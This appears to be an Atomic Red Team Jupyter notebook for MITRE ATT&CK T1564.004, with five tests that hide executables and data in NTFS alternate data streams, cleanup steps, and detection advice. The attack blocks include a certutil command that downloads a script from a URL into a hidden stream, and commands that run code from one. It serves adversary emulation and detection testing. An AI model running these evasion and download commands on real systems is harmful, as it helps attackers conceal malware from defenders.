{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "20bc3cd8",
   "metadata": {},
   "source": "# T1564.004 - NTFS File Attributes\nAdversaries may use NTFS file attributes to hide their malicious data in order to evade detection. Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition. (Citation: SpectorOps Host-Based Jul 2017) Within MFT entries are file attributes, (Citation: Microsoft NTFS File Attributes Aug 2010) such as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files). (Citation: SpectorOps Host-Based Jul 2017) (Citation: Microsoft File Streams) (Citation: MalwareBytes ADS July 2015) (Citation: Microsoft ADS Mar 2014)\n\nAdversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus. (Citation: Journey into IR ZeroAccess NTFS EA) (Citation: MalwareBytes ADS July 2015)"
  },
  {
   "cell_type": "markdown",
   "id": "a2eef97d",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "ad244095",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Alternate Data Streams (ADS)",
    "Execute from Alternate Streams\n\n[Reference - 1](https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f)\n\n[Reference - 2](https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/)\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\ntype C:\\temp\\evil.exe > \"C:\\Program Files (x86)\\TeamViewer\\TeamViewer12_Logfile.log:evil.exe\"\nextrac32 c:\\ADS\\\\procexp.cab c:\\ADS\\\\file.txt:procexp.exe\nfindstr /V /L W3AllLov3DonaldTrump c:\\ADS\\\\procexp.exe > c:\\ADS\\\\file.txt:procexp.exe\ncertutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\\temp:ttt\nmakecab c:\\ADS\\\\autoruns.exe c:\\ADS\\\\cabtest.txt:autoruns.cab\nprint /D:c:\\ADS\\\\file.txt:autoruns.exe c:\\ADS\\\\Autoruns.exe\nreg export HKLM\\SOFTWARE\\Microsoft\\Evilreg c:\\ADS\\\\file.txt:evilreg.reg\nregedit /E c:\\ADS\\\\file.txt:regfile.reg HKEY_CURRENT_USER\\MyCustomRegKey\nexpand \\\\webdav\\folder\\file.bat c:\\ADS\\\\file.txt:file.bat\nesentutl.exe /y c:\\ADS\\\\autoruns.exe /d c:\\ADS\\\\file.txt:autoruns.exe /o \n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9b97a5b3",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1564.004 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "e8064a39",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Store file in Alternate Data Stream (ADS)",
    "Storing files in Alternate Data Stream (ADS) similar to Astaroth malware.\nUpon execution cmd will run and attempt to launch desktop.ini. No windows remain open after the test\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nif (!(Test-Path C:\\Users\\Public\\Libraries\\yanki -PathType Container)) {\n    New-Item -ItemType Directory -Force -Path C:\\Users\\Public\\Libraries\\yanki\n    }\nStart-Process -FilePath \"$env:comspec\" -ArgumentList \"/c,type,c:\\windows\\system32\\cmd.exe,>,`\"C:\\Users\\Public\\Libraries\\yanki\\desktop.ini:desktop.ini`\"\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "eccba660",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1564.004 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "bbbc42f8",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item \"C:\\Users\\Public\\Libraries\\yanki\\desktop.ini\" -Force -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "094afe6b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1564.004 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "d8c2add8",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - Create ADS command prompt",
    "Create an Alternate Data Stream with the command prompt. Write access is required. Upon execution, run \"dir /a-d /s /r | find \":$DATA\"\" in the %temp%\nfolder to view that the alternate data stream exists. To view the data in the alternate data stream, run \"notepad T1564.004_has_ads.txt:adstest.txt\"\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\necho cmd /c echo \"Shell code execution.\"> %temp%\\T1564.004_has_ads_cmd.txt:adstest.txt\nfor /f \"usebackq delims=?\" %i in (%temp%\\T1564.004_has_ads_cmd.txt:adstest.txt) do %i\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "54e3c84e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1564.004 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "9a0595c8",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\ndel %temp%\\T1564.004_has_ads_cmd.txt >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "81ca980d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1564.004 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "870b1b6d",
   "metadata": {},
   "source": "### Atomic Test #4 - Create ADS PowerShell\nCreate an Alternate Data Stream with PowerShell. Write access is required. To verify execution, the the command \"ls -Recurse | %{ gi $_.Fullname -stream *} | where stream -ne ':$Data' | Select-Object pschildname\"\nin the %temp% direcotry to view all files with hidden data streams. To view the data in the alternate data stream, run \"notepad.exe T1564.004_has_ads_powershell.txt:adstest.txt\" in the %temp% folder.\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: The file must exist on disk at specified location (#{file_name})\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path $env:TEMP\\T1564.004_has_ads_powershell.txt) { exit 0 } else { exit 1 }\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Path $env:TEMP\\T1564.004_has_ads_powershell.txt | Out-Null\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "24eb98ff",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1564.004 -TestNumbers 4 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "90e9f142",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\necho \"test\" > $env:TEMP\\T1564.004_has_ads_powershell.txt | set-content -path test.txt -stream adstest.txt -value \"test\"\nset-content -path $env:TEMP\\T1564.004_has_ads_powershell.txt -stream adstest.txt -value \"test2\"\nset-content -path . -stream adstest.txt -value \"test3\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1bcce342",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1564.004 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "ed238883",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item -Path $env:TEMP\\T1564.004_has_ads_powershell.txt -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "37c8e821",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1564.004 -TestNumbers 4 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "d3101dea",
   "metadata": {},
   "source": [
    "### Atomic Test #5 - Create Hidden Directory via $index_allocation",
    "Create an Alternate Data Stream Directory and File with the command prompt. Write access is required. Upon execution, \nrun \"dir /A /Q /R\" in the %temp% folder to view that the alternate data stream folder exists. To view the data in the  \nalternate data stream, run \"type %temp%\\...$.......::$index_allocation\\secrets.txt\"\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nmd %temp%\\...$.......::$index_allocation\necho too many secrets > %temp%\\...$.......::$index_allocation\\secrets.txt\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "74dc4f12",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1564.004 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "2a49bb1a",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nrmdir /S /Q %temp%\\...$.......::$index_allocation >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d87abbbe",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1564.004 -TestNumbers 5 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "00cef50d",
   "metadata": {},
   "source": "## Detection\nForensic techniques exist to identify information stored in NTFS EA. (Citation: Journey into IR ZeroAccess NTFS EA) Monitor calls to the <code>ZwSetEaFile</code> and <code>ZwQueryEaFile</code> Windows API functions as well as binaries used to interact with EA, (Citation: Oddvar Moe ADS1 Jan 2018) (Citation: Oddvar Moe ADS2 Apr 2018) and consider regularly scanning for the presence of modified information. (Citation: SpectorOps Host-Based Jul 2017)\n\nThere are many ways to create and interact with ADSs using Windows utilities. Monitor for operations (execution, copies, etc.) with file names that contain colons. This syntax (ex: <code>file.ext:ads[.ext]</code>) is commonly associated with ADSs. (Citation: Microsoft ADS Mar 2014) (Citation: Oddvar Moe ADS1 Jan 2018) (Citation: Oddvar Moe ADS2 Apr 2018) For a more exhaustive list of utilities that can be used to execute and create ADSs, see https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f.\n\nThe Streams tool of Sysinternals can be used to uncover files with ADSs. The <code>dir /r</code> command can also be used to display ADSs. (Citation: Symantec ADS May 2009) Many PowerShell commands (such as Get-Item, Set-Item, Remove-Item, and Get-ChildItem) can also accept a <code>-stream</code> parameter to interact with ADSs. (Citation: MalwareBytes ADS July 2015) (Citation: Microsoft ADS Mar 2014)"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}